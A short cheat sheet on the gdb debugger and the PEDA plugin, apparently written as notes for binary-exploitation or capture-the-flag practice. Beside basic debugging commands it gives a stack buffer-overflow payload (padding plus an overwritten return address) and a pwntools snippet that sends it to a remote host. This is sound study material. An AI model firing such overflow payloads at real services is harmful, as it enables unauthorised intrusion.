# gdb

## Overview

GDB is a source-level debugger, capable of breaking programs at any specific line, displaying variable values, and determining where errors occurred. Currently, gdb supports C, C++, D, Objective-C, Fortran, Java, OpenCL C, Pascal, assembly, Modula-2, Go, and Ada. A must-have for any serious programmer.

## Usage

	gdb -q <elf_executable>

	
Pass input to exe being debugged

	python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')"

Pass input using python pwn

	from pwn import *
	payload = b"A"*188 + p32(flag_address)
	p = remote(host_ip, port)
	p.sendline(payload)
	p.interactive()

## commands

Disassemble a function

	disassemble <function_name>

Put a break point in a function

	break <function_name>

Send input to the program

	run $(python -c 'print <input>')


# peda

PEDA - Python Exploit Development Assistance for GDB

https://github.com/longld/peda

## commands

checksec

	Checks what security was used when creating the executable

run < file.txt

	Passes input to the exe  being debbuged